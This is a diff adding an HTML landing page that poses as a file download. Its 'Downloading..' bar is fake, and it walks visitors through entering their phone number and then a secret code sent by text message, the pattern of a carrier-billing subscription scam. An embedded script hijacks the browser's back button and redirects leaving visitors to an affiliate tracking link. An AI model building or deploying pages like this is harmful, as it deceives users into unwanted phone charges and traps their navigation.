@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Predownload !</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+</head>
+<body>
+    <div id="app">
+        <center>
+            <div class="container">
+                <div class="title">
+                   Downloading..
+                </div>
+                <div class="loadbar">
+                    <img class="imgloadbar" src="img/loadbar.gif">
+                </div>
+                <div class="txt">
+                    If downloading not started
+                </div>
+                <div class="desript">
+                    <div class="s1"><b>Step 1</b> : Click 'Ok' Button </div>
+                    <div class="s2"><b>Step 2</b> : Insert your phone number</div>
+                    <div class="s3"><b>Step 3</b> : You will get a text message that contains a secret Number</div>
+                    <div class="s4"><b>Step 4</b> : Insert your secret number</div>
+                </div>
+                <div class="btnwrap">
+                    <a href="https://google.com"><button id="cta_btn" class="bluebtn">OK</button></a>
+                </div>
+            </div>
+        </center>
+    </div>
+    <script>
+		window.history.pushState({page: 1}, '', '');
+		window.onpopstate = function(event) {
+		    if(event){
+		        window.location.href = 'https://aff.yanow.xyz/?utm_medium=a9c5b23ea720f8e09b3514be4a43cadc01e4c80a&utm_campaign=my5&cid={clickId}';
+		    }
+		}
+	</script>
+</body>
+<!-- This landing page has been Generated using purelander.com -->
+</html>
